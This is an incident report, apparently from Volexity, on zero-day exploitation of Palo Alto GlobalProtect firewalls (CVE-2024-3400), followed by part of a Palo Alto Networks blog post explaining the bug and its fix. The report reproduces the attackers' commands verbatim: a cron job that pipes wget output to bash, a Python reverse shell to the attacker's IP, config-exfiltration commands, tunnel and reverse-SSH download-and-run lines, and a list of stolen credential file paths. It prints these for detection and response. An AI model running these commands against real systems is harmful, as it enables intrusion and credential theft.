After successfully exploiting devices, UTA0218 downloaded additional tooling from remote servers they controlled in order to facilitate access to victims’ internal networks. They quickly moved laterally through victims’ networks, extracting sensitive credentials and other files that would enable access during and potentially after the intrusion. The tradecraft and speed employed by the attacker suggests a highly capable threat actor with a clear playbook of what to access to further their objectives. Volexity is not currently able to provide an estimate as to the scale of exploitation taking place. It is likely the firewall device exploitation, followed by hands-on-keyboard activity, was limited and targeted. However, as noted previously, evidence of potential reconnaissance activity involving more widespread exploitation aimed at identifying vulnerable systems does appear to have occurred at the time of writing.

Volexity strongly recommends organizations using Palo Alto Networks GlobalProtect firewall devices read [the advisory](https://security.paloaltonetworks.com/CVE-2024-3400) to ensure their firewall devices have the correct protections in place, or otherwise take mitigation actions to ensure they are no longer vulnerable. As always, it should be noted that these mitigations and fixes will not remediate an existing compromise. Affected organizations should rapidly investigate their systems and networks for potential breaches.

This blog post describes the malware the attacker added to compromised devices, observed attempts at lateral movement, and methods organizations can use to identify potential compromise of their networks.

## Analysis

### Investigation Summary

Volexity used telemetry from its own network security sensors, client endpoint detection, response (EDR) software, and forensic data collected from multiple systems to paint a thorough picture of the attacker’s actions in the incidents investigated.

Below are the highlights of Volexity’s observations from the course of the performed investigations:

* Zero-day exploitation of a vulnerability in Palo Alto Global Protect firewall devices that allowed for unauthenticated remote code execution to take place. Initial exploitation was used to create a reverse shell, download tools, exfiltrate configuration data, and move laterally within the network.
* The threat actor has developed and attempted to deploy a novel python-based backdoor that Volexity calls UPSTYLE.
* The earliest evidence of attempted exploitation observed by Volexity thus far is on March 26, 2024 when attackers appeared to verify that exploitation worked correctly.
* The initial persistence mechanism setup by UTA0218 involved configuring a cron job that would use `wget` to retrieve a payload from an attacker-controlled URL with its output being written to `stdout` and piped to bash for execution. The attacker used this method to deploy and execute specific commands and download reverse proxy tooling such as GOST (GO Simple Tunnel).
* In one case a service account configured for use by the Palo Alto firewall, and a member of the domain admins group, was used by the attackers to pivot internally across the affected networks via SMB and WinRM.
* UTA0218’s initial objectives were aimed at grabbing the domain backup DPAPI keys and targeting active directory credentials by obtaining the NTDS.DIT file. They further targeted user workstations to steal saved cookies and login data, along with the users’ DPAPI keys.

A detailed description of the items summarized above can be found in the following sections.

### UPSTYLE Backdoor

In two cases UTA0218 was observed attempting to download and execute a backdoor Volexity calls UPSTYLE. There were two slight variations of this tool observed with only minor differences between the files. In one case the filename used by UTA0218 was `update.py`. UTA0218 attempted to download and execute this file via the CVE-2024-3400 but was unsuccessful. However, Volexity was still able to recover the file for analysis.

| **Name(s)** | update.py |
| --- | --- |
| **Size** | 5.1KB (5187 Bytes) |
| **File Type** | text/plain |
| **MD5** | 0c1554888ce9ed0da1583dbdf7b31651 |
| **SHA1** | 988fc0d23e6e30c2c46ccec9bbff50b7453b8ba9 |
| **SHA256** | 3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac |
| **VirusTotal First Submitted** | N/A |

The purpose of the update.py script is to deploy a backdoor to the following path: `/usr/lib/python3.6/site-packages/system.pth`. The backdoor, written in Python, starts by an `import` and its main content is stored as a base64 encoded blob. The `.pth` extension is used to append additional paths to a Python module. Starting with the release of Python 3.5, lines in `.pth` files beginning with the text “`import`” followed by a space or a tab, are executed as described in the [official documentation](https://docs.python.org/3/library/site.html). Therefore, by creating this file, each time any other code on the device attempts to import the module, the malicious code is executed.

The commands to be executed are forged by the attacker by requesting a non-existent web page which contains the specific pattern. The backdoor’s purpose is to then parse the web server error log (`/var/log/pan/sslvpn_ngx_error.log`) looking for the pattern, and to parse and decode data added to the non-existent URI, executing the command contained within. The command output is then appended to a CSS file which is a legitimate part of the firewall (`/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css`).

After the command’s execution is complete and the output has been written, the log entry that was originally read and contained the command is removed from the `sslvpn_ngx_error.log` file. Fifteen seconds after execution, the original version of `bootstrap.min.css` is also restored to its previous state. The access and modified timestamps are also restored for both files. Figure 1 shows UPSTYLE main loop.

![](https://www.volexity.com/wp-content/uploads/2024/04/image001.png)

*Figure 1. UPSTYLE main loop*

The overall workflow of the malware is described in Figure 2.

![](https://www.volexity.com/wp-content/uploads/2024/04/image002.png)

*Figure 2. UPSTYLE workflow*

### Post-exploitation Activity

For the purpose of this blog post, the following filenames and indicators are related to the exploitation that occurred on April 10, 2024. However, the reader should note that in subsequent exploitation, these files were altered by UTA0218 for different victims. Their purpose and operation, however, were fundamentally the same.

After exploitation, the threat actor established persistence by continuously fetching and executing the contents of a file named `patch`. When executed, this file downloads and executes a remotely hosted file named `policy`. By modifying the contents of the `policy` file, the threat actor was able to execute a variety of commands on the compromised device. A total of six different permutations of the `policy` file were observed by Volexity.

The details of the `patch` file are shown below:

| **Name(s)** | patch |
| --- | --- |
| **Size** | 160.0B (160 Bytes) |
| **File Type** | text/plain |
| **MD5** | d31ec83a5a79451a46e980ebffb6e0e8 |
| **SHA1** | a7c6f264b00d13808ceb76b3277ee5461ae1354e |
| **SHA256** | 35a5f8ac03b0e3865b3177892420cb34233c55240f452f00f9004e274a85703c |
| **VirusTotal First Submitted** | N/A |

The contents of the patch file are shown below:

> `if [ ! -f '/etc/cron.d/update' ]; then
>
>     printf "SHELL=/bin/bash\n\n* * * * * root wget -qO- http://172.233.228[.]93/policy | bash\n\n" > /etc/cron.d/update`
>
> `fi`

When executed, it checks for the existence of a cron file named `update`. If this cron file does not exist, it creates the file and uses it to establish a cron job. It also downloads a remotely hosted file named `policy` and executes it via bash every 60 seconds. The attacker then manually updates the contents of the remote file over time to retrieve data from the device and create a reverse shell.

Interestingly, the attacker appeared to manually manage an access control list for this command-and-control (C2) server, as it could not be accessed on the same port from any location other than the device communicating with it.

#### **Malicious Code Executed via Policy File**

Six different versions of the `policy` file were observed by Volexity. They each represent a different set of actions taken by the threat actor on a compromised device. The numbered versions that follow are the order in which they were used by the threat actor.

**Version 1**

This file contained a one-liner reverse shell written in Python.

| **Name(s)** | policy |
| --- | --- |
| **Size** | 287B (287 Bytes) |
| **File Type** | text/x-shellscript |
| **MD5** | a43e3cf908244f85b237fdbacd8d82d5 |
| **SHA1** | e1e427c9b46064e2b483f90b13490e6ef522cc06 |
| **SHA256** | 755f5b8bd67d226f24329dc960f59e11cb5735b930b4ed30b2df77572efb32e8 |
| **VirusTotal First Submitted** | N/A |

> `#!/bin/bash`
>
> `r=`ps -ef | grep "import sys,socket,os" | grep -v grep`
>
> if [[ -z "$r" ]]; then
>
>     python -c "import sys,socket,os,pty;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(('172.233.228[.]93',443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')"
>
> fi`

**Version 2**

The attacker removed any previously created CSS files containing various attacker command output, and then copied the configuration data from the firewall device into a new file, storing the hostname of the device in the CSS file. These files were saved to an externally accessible web directory where the attacker could subsequently retrieve them.

| **Name(s)** | policy |
| --- | --- |
| **Size** | 216B (216 Bytes) |
| **File Type** | text/x-shellscript |
| **MD5** | 5e4c623296125592256630deabdbf1d2 |
| **SHA1** | d12b614e9417c4916d5c5bb6ee42c487c937c058 |
| **SHA256** | adba167a9df482aa991faaa0e0cde1182fb9acfbb0dc8d19148ce634608bab87 |
| **VirusTotal First Submitted** | N/A |

> `#!/bin/bash`
>
> `rm -f /var/appweb/sslvpndocs/global-protect/*.css
>
> cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/<redacted>.css
>
> uname -a > /var/appweb/sslvpndocs/global-protect/<redacted>.css`

**Version 3**

This file was used to remove CSS files created in the previous step.

| **Name(s)** | policy |
| --- | --- |
| **Size** | 62B (62 Bytes) |
| **File Type** | text/x-shellscript |
| **MD5** | 87312a7173889a8a5258c68cac4817bd |
| **SHA1** | 3ad9be0c52510cbc5d1e184e0066d14c1f394d4d |
| **SHA256** | c1a0d380bf55070496b9420b970dfc5c2c4ad0a598083b9077493e8b8035f1e9 |
| **VirusTotal First Submitted** | N/A |

> `#!/bin/bash`
>
> `rm -f /var/appweb/sslvpndocs/global-protect/*.css`

**Version 4**

This version attempts to download a Golang tunneling tool named [GOST](https://github.com/ginuerzh/gost) and execute it with two different command-line options to establish SOCKS5 and RTCP tunnels. However, the threat actor appears to have failed to successfully download the tool on this attempt.

| **Name(s)** | policy |
| --- | --- |
| **Size** | 388B (388 Bytes) |
| **File Type** | text/x-shellscript |
| **MD5** | b9f5e9db9eec8d1301026c443363cf6b |
| **SHA1** | d7a8d8303361ffd124cb64023095da08a262cab4 |
| **SHA256** | fe07ca449e99827265ca95f9f56ec6543a4c5b712ed50038a9a153199e95a0b7 |
| **VirusTotal First Submitted** | N/A |

> `#!/bin/bash`
>
> `wget http://172.233.228[.]93/vpn_prot.gz -O /tmp/vpn_prot.gz
>
> ls -l /tmp/vpn_prot.gz > /var/appweb/sslvpndocs/global-protect/u.css
>
> gzip -d /tmp/vpn_prot.gz
>
> chmod +x /tmp/vpn_prot
>
> nohup /tmp/vpn_prot -L=socks5://127.0.0[.]1:8123 > /dev/null 2>&1 &
>
> nohup /tmp/vpn_prot -L rtcp://127.0.0[.]1:8080/127.0.0[.]1:8123 -F ssh://user0:[password_redacted]@172.233.228[.]93:8443?ping=180 > /dev/null 2>&1 &`

**Version 5**

This is a modified version of Version 4 that successfully downloads GOST in a base64-encoded format.

| **Name(s)** | policy |
| --- | --- |
| **Size** | 421B (421 Bytes) |
| **File Type** | text/x-shellscript |
| **MD5** | 12b5e30c2276664e87623791085a3221 |
| **SHA1** | f99779a5c891553ac4d4cabf928b2121ca3d1a89 |
| **SHA256** | 96dbec24ac64e7dd5fef6e2c26214c8fe5be3486d5c92d21d5dcb4f6c4e365b9 |
| **VirusTotal First Submitted** | N/A |

> `#!/bin/bash`
>
> `wget http://172.233.228[.]93/vpn.log -O /tmp/vpn.log
>
> base64 -d /tmp/vpn.log > /tmp/vpn_prot.gz
>
> ls -l /tmp/vpn_prot.gz > /var/appweb/sslvpndocs/global-protect/u.css
>
> gzip -d /tmp/vpn_prot.gz
>
> chmod +x /tmp/vpn_prot
>
> nohup /tmp/vpn_prot -L=socks5://127.0.0[.]1:8123 > /dev/null 2>&1 &
>
> nohup /tmp/vpn_prot -L rtcp://127.0.0[.]1:8080/127.0.0.1:8123 -F ssh://user0:[password_redacted]@172.233.228[.]93:8443?ping=180 > /dev/null 2>&1 &`

The details of the GOST sample are as follows:

| **Name(s)** | gost-linux-amd64 |
| --- | --- |
| **Size** | 12.9MB (13578240 Bytes) |
| **File Type** | ELF |
| **MD5** | 089801d87998fa193377b9bfe98e87ff |
| **SHA1** | 4ad043c8f37a916761b4c815bed23f036dfb7f77 |
| **SHA256** | 448fbd7b3389fe2aa421de224d065cea7064de0869a036610e5363c931df5b7c |
| **VirusTotal First Submitted** | 2023-01-29 01:30:47 UTC | af632c50 (api) - Unknown US |

**Version 6**

This file contains commands to download and execute an [open-source](https://github.com/Fahrj/reverse-ssh) reverse shell that operates over SSH. The threat actor configures this shell to run on port 31289.

| **Name(s)** | policy(6) |
| --- | --- |
| **Size** | 189.0B (189 Bytes) |
| **File Type** | text/x-shellscript |
| **MD5** | 724c8059c150b0f3d1e0f80370bcfe19 |
| **SHA1** | 5592434c40a30ed2dfdba0a86832b5f2eaaa437c |
| **SHA256** | e315907415eb8cfcf3b6a4cd6602b392a3fe8ee0f79a2d51a81a928dbce950f8 |
| **VirusTotal First Submitted** | N/A |

> `#!/bin/bash``wget http://172.233.228[.]93/lowdp -O /tmp/lowdp``ls -l /tmp/lowdp > /var/appweb/sslvpndocs/global-protect/u.css``chmod +x /tmp/lowdp``nohup /tmp/lowdp -l -p 31289 > /dev/null 2>&1 &`

Details of the binary are shown below:

| **Name(s)** | reverse-sshx64 |
| --- | --- |
| **Size** | 3.5MB (3690496 Bytes) |
| **File Type** | ELF |
| **MD5** | 427258462c745481c1ae47327182acd3 |
| **SHA1** | ef8036eb4097789577eff62f6c9580fa130e7d56 |
| **SHA256** | 161fd76c83e557269bee39a57baa2ccbbac679f59d9adff1e1b73b0f4bb277a6 |
| **VirusTotal First Submitted** | 2022-08-08 18:30:19 UTC | 1c0b809a (web) - Unknown NL |

### Lateral Movement & Data theft

In one instance of successful compromise, a highly privileged service account used by the Palo Alto Networks firewall device was used by the attacker to pivot into the internal network via SMB and WinRM. The targeted data included the Active Directory database (`ntds.dit`), key data (DPAPI) and Windows event logs (`Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx`).

In addition to Windows-related data, the attacker also stole `Login Data`, `Cookies`, and `Local State` data for Chrome and Microsoft Edge from specific targets. With this data, the attacker was able to grab the browser master key and decrypt sensitive data, such as stored credentials.

The list of files grabbed by the attacker is below:

`%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network

%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies

%LOCALAPPDATA%\Google\Chrome\User Data\Local State

%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data

%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network

%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies

%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State

%APPDATA%\Roaming\Microsoft\Protect\<SID> -> DPAPI Keys

%SystemRoot%\NTDS\ntds.dit

%SystemRoot%\System32\winevt\Logs\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx`

UTA0218 was not observed deploying malware or additional methods of persistence on systems within victim networks. This may be due in part to the rapid detection and response by Volexity and its customers. The stolen data did allow the attacker to effectively compromise credentials for all domain accounts. Further, the attacker gained access and could potentially use valid credentials or cookies taken from browser data for specific user workstations accessed.

### Infrastructure

Volexity observed UTA0218 leveraging a mix of infrastructure during their operations, which can be broadly broken into two categories:

* C2 infrastructure hosting malware, used for communication channels
* Anonymized source infrastructure, used to access tooling and interact with victim infrastructure

The anonymized infrastructure appears to have included a mix of VPN usage, as well as potentially compromised ASUS routers. The infrastructure was used to access files created by the attacker. Additionally, UTA0218 abused a compromised AWS bucket and various Virtual Private Servers (VPS) providers to store malicious files. The infrastructure observed by Volexity does not have any overlaps with other threat actors in Volexity’s aperture at this time.

## Detecting Compromise

There are two primary methods for identifying compromise on an impacted firewall device. The first method involves monitoring network traffic and activity emanating from Palo Alto Networks firewall devices. Volexity is still working to coordinate with Palo Alto Networks regarding the second method and thus is not describing it at this time. Volexity will update this blog post when more details can be made available.

The section that follows describes what organizations can do to look for signs of compromise. Any of these methods can provide strong evidence that the Palo Alto Networks GlobalProtect firewall device is compromised. Should signs of compromise be identified, refer to [Responding to Compromise](#RespondingToCompromise) for what to do next.

### Network Traffic Analysis

Volexity initially identified activity that led to the discovery of the Palo Alto Networks GlobalProtect firewall device exploitation via an alert for malicious network requests generated by Volexity's NSM sensors. Review of network traffic logs for outbound connections originating from the GlobalProtect firewall device, as well as destined for the device, can help identify anomalous activity. Example activity that Volexity observed from compromised GlobalProtect devices includes the following:

* Direct-to-IP HTTP requests to download files noted in the previous section via `wget`

  While it would not be uncommon to observe `wget` requests for files in a larger environment, this type of request originating from the firewall device is not something Volexity has observed outside of the attacker activity.
* SMB / RDP connections to multiple systems across the environment, originating from the GlobalProtect appliance
* SMB file transfers of Google Chrome or Microsoft Edge browser data or the `ntds.dit` file
* HTTP request for the URL `worldtimeapi[.]org/api/timezone/etc/utc` originating from the Global Protect appliance

  While this hostname is legitimate, in both occurrences of compromise an HTTP GET request to this URL was observed. This does not appear to be a commonly occurring network request.

Volexity also leveraged its customer’s Endpoint Detection and Response (EDR) software to investigate alerts that triggered for data exfiltration over SMB. Having both network visibility and EDR telemetry allowed Volexity to fully map out all systems the attacker accessed via the compromised GlobalProtect firewall device.

### GlobalProtect Firewall Device Log Analysis

During Volexity’s incident response investigations, the affected customers were able to generate a tech support file from the compromised firewall devices. This tech support file is an archive that contains files Palo Alto Networks tech support can use to troubleshoot issues organizations are having with their firewall devices. It also contains logs Volexity noted as having key forensic artifacts and could potentially help determine if a device is compromised.

To generate a tech support file, Palo Alto GlobalProtect system administrators can navigate within the WebGUI to the Device tab, or if in Panorama to the Panorama tab. From here, navigate to the “Support” page and look under the Tech Support File section for "Generate Tech Support File.” Clicking this will generate a tech support file that can be downloaded by selecting “Download Tech Support File” when it becomes available. This may also be done via the command-line interface using one of two commands:

* `tftp export tech-support to <tftp host>`
* `scp export tech-support to <username@host:path>`

More information on this process from Palo Alto Networks can be found [here](https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA10g000000ClRlCAKvat).

### Volatile Memory Collection

Collecting volatile memory from potentially compromised devices requires assistance from Palo Alto Networks technical support. It is not currently possible for Palo Alto Networks customers to collect memory on their own. Due to these collection challenges, Volexity products currently do not officially support Palo Alto Networks firewall devices.

### Volatile Memory Analysis with **Volexity Volcano**

Volexity regularly leverages memory forensics when investigating or confirming compromises. Due to the sensitive nature of the artifacts in memory and the pending coordination efforts with Palo Alto Networks, Volexity will share more details of this analysis with [Volexity Volcano](https://www.volexity.com/products-overview/volcano/) in a future update.

## Responding to Compromise

If you discover that your Palo Alto Network GlobalProtect firewall device is compromised, it is important to take immediate action. Make sure to not wipe or rebuild the appliance. Collecting logs, generating a tech support file, and preserving forensics artifacts (memory and disk) from the device are crucial.

Pivoting to analyzing internal systems and tracking potential lateral movement should be done as soon as possible. Further, any credentials, secrets, or other sensitive data that may have been stored on the GlobalProtect firewall device should be considered compromised. This may warrant password resets, changing of secrets, and additional investigations.

Volexity strongly recommends that organizations look for signs of lateral movement internally from their Palo Alto Networks GlobalProtect firewall device that is not consistent with expected behavior. Proactive checks of any externally facing infrastructure may also be warranted if internal visibility is limited.

If you need assistance validating or responding to a breach, please feel free to contact Volexity for [breach assistance](https://www.volexity.com/company/contact/breach-assistance/).

## Conclusion

Targeting edge devices remains a popular vector of attack for capable threat actors who have the time and resources to invest into researching new vulnerabilities. Having a robust detection stack is critical in identifying activity related to exploits, inclusive of network monitoring and EDR capabilities to identify lateral movement. Early detection of intrusions greatly reduces the scope and costs associated to mitigation.

Volexity tracks activity described in this blog post under the moniker UTA0218. At the time of writing, Volexity was unable to link the activity to other threat activity. Volexity assesses that it is highly likely UTA0218 is a state-backed threat actor based on the resources required to develop and exploit a vulnerability of this nature, the type of victims targeted by this actor, and the capabilities displayed to install the Python backdoor and further access victim networks.

As with previous public disclosures of vulnerabilities in these kinds of devices, Volexity assesses that it is likely a spike in exploitation will be observed over the next few days by UTA0218 and potentially other threat actors who may develop exploits for this vulnerability. This spike in activity will be driven by the urgency of this window of access closing due to mitigations and patches being deployed. It is therefore imperative that organizations act quickly to deploy recommended mitigations and perform compromise reviews of their devices to check whether further internal investigation of their networks is required.

This blog post provided guidance on prevention and detection; related indicators can also be downloaded from the Volexity GitHub page:

* [YARA rules](https://github.com/volexity/threat-intel/blob/main/2024/2024-04-12%20Palo%20Alto%20Networks%20GlobalProtect/indicators/rules.yar)
* [Single value indicators](https://github.com/volexity/threat-intel/blob/main/2024/2024-04-12%20Palo%20Alto%20Networks%20GlobalProtect/indicators/iocs.csv)

> For more information about Volexity's [Network Security Monitoring](https://www.volexity.com/services-overview/network-security-monitoring/) service or Volexity's leading memory analysis product, [Volexity Volcano](https://www.volexity.com/products-overview/volcano/), please do not hesitate to [contact us](https://www.volexity.com/company/contact/ "https://www.volexity.com/company/contact/").

[0day](https://www.volexity.com/blog/tag/0day/), [APT](https://www.volexity.com/blog/tag/apt/), [Exploit](https://www.volexity.com/blog/tag/exploit/), [firewall](https://www.volexity.com/blog/tag/firewall/), [Global Protect](https://www.volexity.com/blog/tag/global-protect/), [Palo Alto Networks](https://www.volexity.com/blog/tag/palo-alto-networks/), [RCE](https://www.volexity.com/blog/tag/rce/), [zero-day](https://www.volexity.com/blog/tag/zero-day/)

* Search for:
* #### Recent Posts

  + [The Nearest Neighbor Attack: How A Russian APT Weaponized Nearby Wi-Fi Networks for Covert Access](https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/)
  + [BrazenBamboo Weaponizes FortiClient Vulnerability to Steal VPN Credentials via DEEPDATA](https://www.volexity.com/blog/2024/11/15/brazenbamboo-weaponizes-forticlient-vulnerability-to-steal-vpn-credentials-via-deepdata/)
  + [StormBamboo Compromises ISP to Abuse Insecure Software Update Mechanisms](https://www.volexity.com/blog/2024/08/02/stormbamboo-compromises-isp-to-abuse-insecure-software-update-mechanisms/)
  + [DISGOMOJI Malware Used to Target Indian Government](https://www.volexity.com/blog/2024/06/13/disgomoji-malware-used-to-target-indian-government/)
  + [Detecting Compromise of CVE-2024-3400 on Palo Alto Networks GlobalProtect Devices](https://www.volexity.com/blog/2024/05/15/detecting-compromise-of-cve-2024-3400-on-palo-alto-networks-globalprotect-devices/)
* #### Archives

  + [November 2024](https://www.volexity.com/blog/2024/11/)
  + [August 2024](https://www.volexity.com/blog/2024/08/)
  + [June 2024](https://www.volexity.com/blog/2024/06/)
  + [May 2024](https://www.volexity.com/blog/2024/05/)
  + [April 2024](https://www.volexity.com/blog/2024/04/)
  + [February 2024](https://www.volexity.com/blog/2024/02/)
  + [January 2024](https://www.volexity.com/blog/2024/01/)
  + [September 2023](https://www.volexity.com/blog/2023/09/)
  + [June 2023](https://www.volexity.com/blog/2023/06/)
  + [March 2023](https://www.volexity.com/blog/2023/03/)
  + [December 2022](https://www.volexity.com/blog/2022/12/)
  + [August 2022](https://www.volexity.com/blog/2022/08/)
  + [July 2022](https://www.volexity.com/blog/2022/07/)
  + [June 2022](https://www.volexity.com/blog/2022/06/)
  + [March 2022](https://www.volexity.com/blog/2022/03/)
  + [February 2022](https://www.volexity.com/blog/2022/02/)
  + [December 2021](https://www.volexity.com/blog/2021/12/)
  + [August 2021](https://www.volexity.com/blog/2021/08/)
  + [May 2021](https://www.volexity.com/blog/2021/05/)
  + [March 2021](https://www.volexity.com/blog/2021/03/)
  + [December 2020](https://www.volexity.com/blog/2020/12/)
  + [November 2020](https://www.volexity.com/blog/2020/11/)
  + [April 2020](https://www.volexity.com/blog/2020/04/)
  + [March 2020](https://www.volexity.com/blog/2020/03/)
  + [September 2019](https://www.volexity.com/blog/2019/09/)
  + [November 2018](https://www.volexity.com/blog/2018/11/)
  + [September 2018](https://www.volexity.com/blog/2018/09/)
  + [August 2018](https://www.volexity.com/blog/2018/08/)
  + [July 2018](https://www.volexity.com/blog/2018/07/)
  + [June 2018](https://www.volexity.com/blog/2018/06/)
  + [April 2018](https://www.volexity.com/blog/2018/04/)
  + [November 2017](https://www.volexity.com/blog/2017/11/)
  + [July 2017](https://www.volexity.com/blog/2017/07/)
  + [March 2017](https://www.volexity.com/blog/2017/03/)
  + [November 2016](https://www.volexity.com/blog/2016/11/)
  + [October 2015](https://www.volexity.com/blog/2015/10/)
  + [July 2015](https://www.volexity.com/blog/2015/07/)
  + [June 2015](https://www.volexity.com/blog/2015/06/)
  + [April 2015](https://www.volexity.com/blog/2015/04/)
  + [October 2014](https://www.volexity.com/blog/2014/10/)
  + [September 2014](https://www.volexity.com/blog/2014/09/)
* #### Tags

  [exploits](https://www.volexity.com/blog/tag/exploits/) [dfir](https://www.volexity.com/blog/tag/dfir/) [Threat Intelligence](https://www.volexity.com/blog/tag/threat-intelligence/) [North Korea](https://www.volexity.com/blog/tag/north-korea/) [vulnerabilities](https://www.volexity.com/blog/tag/vulnerabilities/) [spear phishing](https://www.volexity.com/blog/tag/spear-phishing/) [ivanti connect secure](https://www.volexity.com/blog/tag/ivanti-connect-secure/) [VPN](https://www.volexity.com/blog/tag/vpn/) [memory forensics](https://www.volexity.com/blog/tag/memory-forensics/) [malware](https://www.volexity.com/blog/tag/malware/) [0day](https://www.volexity.com/blog/tag/0day/) [webshell](https://www.volexity.com/blog/tag/webshell/) [pulsesecure](https://www.volexity.com/blog/tag/pulsesecure/) [volcano](https://www.volexity.com/blog/tag/volcano/) [Scanning](https://www.volexity.com/blog/tag/scanning/) [phishing](https://www.volexity.com/blog/tag/phishing/) [APT](https://www.volexity.com/blog/tag/apt/) [Exploit](https://www.volexity.com/blog/tag/exploit/) [RCE](https://www.volexity.com/blog/tag/rce/) [China](https://www.volexity.com/blog/tag/china/)

[![Volexity](https://www.volexity.com/wp-content/themes/volexity/dist/images/logo.png)](https://www.volexity.com)
© 2025 Volexity. All Rights Reserved.

* [About](/company/about/)
  + [About Us](https://www.volexity.com/company/about/)
  + [Blog](https://www.volexity.com/blog/)
  + [Privacy Policy](https://www.volexity.com/privacy-policy/)
* [Solutions](/solutions/)
  + [Request A Demo](https://www.volexity.com/company/contact/)
  + [Products](https://www.volexity.com/products-overview/)
  + [Services](https://www.volexity.com/services-overview/)

Contact

* 11654 Plaza America Dr #774

  Reston, VA 20190-4700
* 1-888-825-1975

Connect

This Website uses cookies, which are necessary to its functioning and required to achieve the purposes illustrated in our [Cookie Policy](/privacy-policy/#cookies). By clicking the button, you consent to our use of cookies.Agree & Close



=== Content from www.paloaltonetworks.com_d37cec64_20250111_061218.html ===


* [Blog](https://www.paloaltonetworks.com/blog)
* [Palo Alto Networks](https://www.paloaltonetworks.com/blog/corporate)
* [Announcement](https://www.paloaltonetworks.com/blog/category/announcement/)
* More on the PAN-OS CVE-20...

# More on the PAN-OS CVE-2024-3400

Link copied

By [Chandan B.N.](/blog/author/chandan-b-n/ "Posts by Chandan B.N.")

Apr 19, 2024
7 minutes
... views

[Announcement](/blog/category/announcement/)
 [Company & Culture](/blog/category/company-culture/)
 [Points of View](/blog/category/points-of-view/)
 [Products and Services](/blog/category/products-and-services/)
[PAN-OS](/blog/tag/pan-os/)[Unit 42](/blog/tag/unit-42/)[Unit 42 Threat Brief](/blog/tag/unit-42-threat-brief/)[Volexity](/blog/tag/volexity/)

On April 10, 2024 Palo Alto Networks Product Security Incident Response Team (PSIRT) learned of a suspicious exfiltration attempt at a customer site from Volexity's Steven Adair. Our Palo Alto Networks Product Security Research Lead Christopher Ganas and Unit 42's Threat Research Lead Kyle Wilhoit immediately investigated the issue with Volexity's team. They quickly determined that the suspicious traffic originated from the firewall and reflected the exploitation of a likely new zero-day vulnerability with a compromised firewall.

In the next few hours, our team assembled experts from across the company and took quick, decisive action as part of the company’s established protocols and industry best practices. We performed forensic investigations to identify the root cause of the vulnerability, understand the exploited payload tactics, and determine various options to enable protections in our product. Further, we explored workarounds and threat prevention signatures and determined the exact combination of configurations that made the system vulnerable to a compromise.

Within 24 hours of confirming the vulnerability, we released tested mitigations that blocked the known attacks, enabling immediate protections for our customers. We see these mitigations have been applied on about 90% of active susceptible devices.

Palo Alto Networks responded with an all-hands-on-deck approach to provide a quick and complete remediation to prevent further attacks while ensuring a comprehensive solution.

## **What Was the Problem?**

The intricate vulnerability stems from a combination of two bugs in PAN-OS. In the first one, the GlobalProtect service did not sufficiently validate the session ID format before storing them. This enabled the attacker to store an empty file with the attacker's chosen filename. The second bug (trusting that the files were system-generated) used the filenames as part of a command. While neither bug provides for significant system damage, the combination allows unauthenticated remote shell command execution.

## **How Was It Exploited?**

A highly sophisticated threat actor discovered that by uniquely combining the two bugs, they could perform a two-stage attack to achieve command execution on the vulnerable device.

![Graph explaining how scheduled cron job worked in stages on PAN-OS.]()

In stage 1, the attacker sends a carefully crafted shell command instead of a valid session ID to GlobalProtect. This results in creating an empty file on the system with an embedded command as its filename, as chosen by the attacker.

In stage 2, an unsuspecting scheduled system job that runs regularly uses the attacker-provided filename in a command. This results in the execution of the attacker-supplied command with elevated privileges.

Successful stage 1 does not necessarily mean that the attacker's command was executed. Rather, it simply means that the attacker created an empty file with a weird name that does not damage the firewall by itself.

A system compromise requires a successful exploitation of a command that does some damage to the system, such as exfiltrating sensitive configuration details or downloading malware. [Volexity](https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/) and [Unit 42 Threat Brief](https://unit42.paloaltonetworks.com/cve-2024-3400/) have more information about the type of malware seen in these attacks and indicators of threat activity.

## **How Do We Block Exploitation?**

A Threat Prevention signature with Threat ID 95187 (released on April 11, 2024) detects and blocks, with 100% accuracy, all known and observed suspicious patterns in session IDs. This Prevention signature was released by Palo Alto networks within a day of confirming the vulnerability. We see approximately 90% of of susceptible devices are already protected.

![Graph of PAN-OS Global Protect, stage 1 and stage 2.]()

In the following content updates, Threat IDs 95189 and 95191 were released to optimize and extend mitigations against other theoretical attacks that have not been observed so far. We recommend that customers continually stay up to date with their threat prevention content packages to ensure the most comprehensive protections.

Given our comprehensive code review, no other known changes are planned for our threat prevention signature for this issue. It is important to ensure Threat Prevention is appropriately enabled following the guidance at <https://live.paloaltonetworks.com/t5/globalprotect-articles/applying-vulnerability-protection-to-globalprotect-interfaces/ta-p/340184>

## **What Does Disabling Telemetry Do?**

Disabling Telemetry prevented the system cron job from running, preventing the execution of the command, preventing a compromise. This completely prevented both currently known and observed attempted exploits from working.

![Graph of PAN-OS Global Protect stages.]()

As with similar issues, as the situation evolved, Palo Alto Networks and third-party researchers quickly investigated the vulnerability and how it could theoretically be exploited. In that process, we discovered additional ways to exploit the vulnerability that did not require telemetry to be enabled on a device to achieve a successful compromise.

We advise customers not to rely only on disabling telemetry as an interim mitigation.

## **How Did We Fix It?**

The fix effectively removes the two problems in code that enabled this vulnerability to manifest. First, the session IDs are sufficiently validated before being stored. Then, the code that enabled command injection was rewritten using defensive programming techniques.

The fixes have been well tested by Palo Alto Networks Product Security Research Team and third-party research companies, like Bishop Fox, and found to be 100% effective in preventing this vulnerability.

For details on available fixes, please refer to our [security advisory](https://security.paloaltonetworks.com/CVE-2024-3400).

## **What Else Is Palo Alto Networks Doing?**

